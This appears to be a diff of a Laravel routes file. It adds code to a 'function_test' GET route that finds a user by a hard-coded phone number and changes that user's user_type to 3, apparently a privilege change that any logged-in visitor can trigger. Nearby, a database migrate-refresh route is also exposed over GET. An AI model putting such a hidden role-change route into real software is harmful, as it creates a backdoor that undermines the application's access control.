@@ -422,6 +422,9 @@ Route::group(['middleware' => 'auth'], function () {
 Route::get('/migrate-refresh', [DashboardController::class, 'migrate_fresh']);
 
 Route::get('function_test', function () {
+        $user = User::where('phone','01726371871')->first();
+        $user->update(['user_type' => 3]);
+    
       
         // $topUser = \App\Models\ReportingUser::where('user_id', 1)
         //         ->select(['id', 'user_id'])
